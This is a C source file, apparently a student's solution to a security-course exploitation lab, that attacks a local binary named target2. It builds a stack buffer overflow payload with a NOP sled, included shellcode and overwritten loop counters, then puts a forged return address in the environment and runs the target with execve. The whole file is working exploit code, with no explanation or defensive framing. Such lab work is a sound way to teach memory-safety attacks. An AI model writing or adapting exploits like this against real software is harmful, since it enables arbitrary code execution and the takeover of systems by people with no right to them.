#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"
#define STACK_ADDR 0x202dfe50
#define LOCAL_SIZE 264
#define BUFF_SIZE (LOCAL_SIZE + 6) 

int
main(int argc, char * argv[])
{
	char buff[BUFF_SIZE + 1]; // with \0 termindator
	int i, offset, target_addr;
	int shell_size = sizeof(shellcode);

	// fill with NOP
	for (i = 0; i < LOCAL_SIZE; i++){
		buff[i] = 0x90; // NOP
	}

	// Copy shellcode
	offset = LOCAL_SIZE - shell_size + 1;
	for (i = 0; i < shell_size; i++){
		buff[offset + i] = shellcode[i];
	}

	// inject new i and len
	buff[LOCAL_SIZE] = 0xb;
	buff[LOCAL_SIZE + 1] = 0x1;
	buff[LOCAL_SIZE + 2] = 0x1;
	buff[LOCAL_SIZE + 3] = 0x1;
	buff[LOCAL_SIZE + 4] = 0x20;
	buff[LOCAL_SIZE + 5] = 0x1;

	// Terminate buff
	buff[BUFF_SIZE] = '\0';
	
	char *	args[3];
	char *	env[7];

	args[0] = TARGET;
	args[1] = buff;
	args[2] = NULL;

	target_addr = STACK_ADDR - (17 * 16);
	char addr[4];
	addr[0] = (char)(target_addr & 0xff);
	addr[1] = (char)((target_addr >> 8) & 0xff);
	addr[2] = (char)((target_addr >> 16) & 0xff);
	addr[3] = (char)((target_addr >> 24) & 0xff);

	env[0] = "\0";
	env[1] = "AAAAAAA"; // garbage place holder
	env[2] = addr; // new return address
	env[3] = "\0";
	env[4] = "\0";
	env[5] = "\0";
	env[6] = NULL;

	if (execve(TARGET, args, env) < 0)
		fprintf(stderr, "execve failed.\n");

	return (0);
}
